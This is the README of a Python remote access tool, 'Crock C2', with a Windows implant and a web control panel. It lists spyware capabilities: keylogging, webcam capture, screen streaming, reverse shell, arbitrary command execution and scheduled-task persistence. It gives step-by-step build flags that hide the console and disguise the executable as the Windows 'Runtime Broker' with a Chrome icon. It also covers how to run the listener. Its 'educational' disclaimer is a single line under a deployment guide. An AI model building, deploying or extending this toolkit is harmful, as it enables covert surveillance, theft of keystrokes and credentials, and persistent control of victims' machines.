# Crock C2

Remote access tool with web control panel.
Python implant compiled with Nuitka.
Encrypted channel: AES-256-GCM with per-packet nonce.
Key exchange: X25519 ECDH per session.
Web panel: JWT authentication with role-based access control.

## Features

- Reverse shell
- Screenshot
- Webcam photo
- Process list
- Keylogger (start / dump / stop / clear)
- Screen stream
- Persistence (scheduled task)
- AES-256-GCM encrypted channel (per-packet nonce)
- X25519 ECDH per-session handshake
- JWT-authenticated web panel with RBAC (viewer / operator / admin)

## Requirements

- Linux (Kali / Ubuntu / Debian) - build + server
- Windows 10/11 - target
- Python 3.10+
- Nuitka

## Install dependencies

sudo apt update
sudo apt install -y python3 python3-pip python3-venv
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

## Files

- implant.py       - implant source
- server.py        - C2 listener + web server
- dashboard.html   - web panel (must be next to server.py)
- login.html       - login page
- auth.py          - JWT authentication with RBAC
- crypto layer.py  - AES-256-GCM encryption + X25519 handshake helpers
- requirements.txt - Python dependencies
- chrome.ico       - icon for the build (optional)

## Build implant

Edit HOST in implant.py if needed (default 192.168.122.1).

sudo apt install -y g++-mingw-w64-x86-64
source venv/bin/activate
nuitka \
  --standalone \
  --onefile \
  --mingw64 \
  --windows-disable-console \
  --windows-company-name="Crock" \
  --windows-product-name="Runtime Broker" \
  --windows-file-description="Runtime Broker" \
  --windows-file-version=10.0.19041.1 \
  --windows-product-version=10.0.19041.1 \
  --windows-icon-from-ico=chrome.ico \
  --enable-plugin=anti-bloat \
  --assume-yes-for-downloads \
  --remove-output \
  implant.py

Output: implant.exe (rename to anything).

## Run server

export CROCK_ADMIN_PW=strong-password
export CROCK_OP1_PW=another-strong-password
export CROCK_VIEWER_PW=viewer-password
source venv/bin/activate
python3 server.py

- Listener: 0.0.0.0:4444
- Web UI:   http://127.0.0.1:5000

## Authentication

- Web panel requires JWT login.
- JWT secret is generated on first run and stored in .jwt_secret with mode 0600.
- Token TTL: 3600 seconds.
- Roles:
  - viewer   - read client list
  - operator - send commands to clients
  - admin    - manage operators

Default operators (override with environment variables):

- admin   / $CROCK_ADMIN_PW    / admin
- op1     / $CROCK_OP1_PW      / operator
- viewer  / $CROCK_VIEWER_PW   / viewer

## Encryption

- Transport payload: AES-256-GCM (nonce 12 bytes, tag 16 bytes) per packet.
- Frame format: 4-byte big-endian length prefix + nonce + ciphertext + tag.
- Key exchange: X25519 ECDH on connect, session key derived via HKDF-SHA256.
- No static shared key: each connection uses its own session key.

## Usage

1. Start server.py.
2. Run the compiled exe on the Windows machine.
3. Open http://127.0.0.1:5000 and log in.
4. Select the client and use the panel.

## Commands

| Command       | Action                        |
|---------------|-------------------------------|
| info          | Client information            |
| screenshot    | Take screenshot               |
| webcam        | Webcam photo                  |
| proclist      | List processes                |
| keylog_start  | Start keylogger               |
| keylog_dump   | Dump keylogger buffer         |
| keylog_stop   | Stop keylogger                |
| keylog_clear  | Clear keylogger buffer        |
| stream_start  | Start screen stream           |
| stream_stop   | Stop screen stream            |
| persist       | Add scheduled task            |
| sh:<command>  | Execute shell command         |

## Notes

- Web UI listens only on localhost.
- Default C2 address is 192.168.122.1:4444.
- Persistence uses a scheduled task.
- .jwt_secret is created automatically and must not be committed.
- Recommended .gitignore entries:
  .jwt_secret
  venv/
  __pycache__/
  *.exe
  implant.build/
  implant.dist/
  implant.onefile-build/
- Lab / authorized use only.

## Disclaimer

For educational and research purposes only.
